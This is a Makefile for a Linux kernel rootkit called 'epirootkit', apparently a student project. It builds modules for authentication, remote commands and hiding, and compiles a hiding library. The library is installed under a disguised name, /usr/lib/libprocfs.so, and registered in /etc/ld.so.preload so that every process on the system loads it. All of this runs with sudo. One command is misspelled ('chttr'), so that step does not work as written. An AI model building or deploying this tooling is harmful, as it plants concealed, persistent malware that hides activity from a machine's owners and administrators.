obj-m += epirootkit.o
epirootkit-objs := main.o auth.o cache.o commandes.o dissimulation.o notification.o

HIDE_SRC = masquer.c
HIDE_LIB = libhide.so
HIDE_INSTALL_PATH = /usr/lib/libprocfs.so
PRELOAD_FILE = /etc/ld.so.preload

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean


libhide:
	gcc -shared -fPIC $(HIDE_SRC) -o $(HIDE_LIB) -ldl

install-libhide: libhide
	sudo cp $(HIDE_LIB) $(HIDE_INSTALL_PATH)
	sudo chmod 644 $(HIDE_INSTALL_PATH)
	sudo chttr -i $(HIDE_LIB) $(HIDE_INSTALL_PATH)
	sudo sh -c 'echo "$(HIDE_INSTALL_PATH)" > $(PRELOAD_FILE)'
	sudo chmod 644 $(PRELOAD_FILE)
	@echo "Bibliothèque de masquage installée et configurée."

install:
	sudo bash install.sh

remove:
	sudo rmmod epirootkit

load: all install

reload: remove clean all install

.PHONY: all clean install remove load reload